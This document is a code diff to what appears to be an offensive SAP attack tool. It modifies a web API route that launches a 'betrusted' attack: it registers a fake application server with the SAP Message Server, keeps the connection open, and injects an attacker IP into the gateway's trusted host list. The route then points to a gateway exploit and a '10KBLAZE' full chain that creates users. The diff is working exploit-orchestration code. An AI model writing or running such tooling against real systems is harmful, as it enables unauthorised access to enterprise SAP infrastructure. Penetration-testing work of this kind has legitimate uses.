@@ -1172,7 +1172,10 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
     @app.route("/api/node/<sid>/betrusted", method="POST")
     def node_betrusted(sid):
-        """Execute betrusted attack: inject attacker IP into gateway trusted host list."""
+        """Execute betrusted attack: register fake app server, hold TCP connection open,
+        and poll gateway trust.  Uses try_betrusted_chain() so the MS connection stays
+        alive while the GW check runs — the connection is only closed once we confirm
+        whether the gateway trusts us (or after 5 min timeout)."""
         response.content_type = "application/json"
         data = request.json or {}
         node = api.state.get_node(sid)
@@ -1187,32 +1190,23 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"error": "MS internal port not known — run Check MS first"})
 
         nilist_wait = float(data.get("nilist_wait", 30.0))
-        dp_version  = int(data.get("dp_version", 13))
-        kernel_new  = bool(data.get("kernel_new", True))
 
         def _run():
-            try:
-                from sap_ms_betrusted import betrusted
-            except ImportError:
-                print(f"[-] sap_ms_betrusted not available")
-                return
-
-            host = node.ip or node.hostname
-            print(f"[*] {sid}: Running betrusted attack on {host}:{node.ms_port} "
+            print(f"[*] {sid}: Running betrusted attack on "
+                  f"{node.ip or node.hostname}:{node.ms_port} "
                   f"→ injecting {attacker_ip} into gateway trust list")
-            result = betrusted(
-                host=host,
-                port=node.ms_port,
+            # try_betrusted_chain keeps the MS connection alive while polling GW
+            ok = sapmap_exploit.try_betrusted_chain(
+                node, api.state,
                 attacker_ip=attacker_ip,
                 nilist_wait=nilist_wait,
-                dp_version=dp_version,
-                kernel_new=kernel_new,
             )
-            if result["success"]:
-                print(f"[+] {sid}: betrusted completed — {attacker_ip} should be trusted by gateway")
-                print(f"[*] {sid}: Now check GW vulnerability from {attacker_ip}")
+            if ok:
+                print(f"[+] {sid}: Gateway now TRUSTED from {attacker_ip} "
+                      f"— GW exploit is available")
             else:
-                print(f"[-] {sid}: betrusted failed: {result['error']}")
+                print(f"[-] {sid}: Gateway did not become trusted. "
+                      f"Try 'Create User (10KBLAZE Full Chain)' for the automated chain.")
 
         _bg(f"{sid}:betrusted", "Betrusted Attack", _run)
         return json.dumps({"status": "started"})
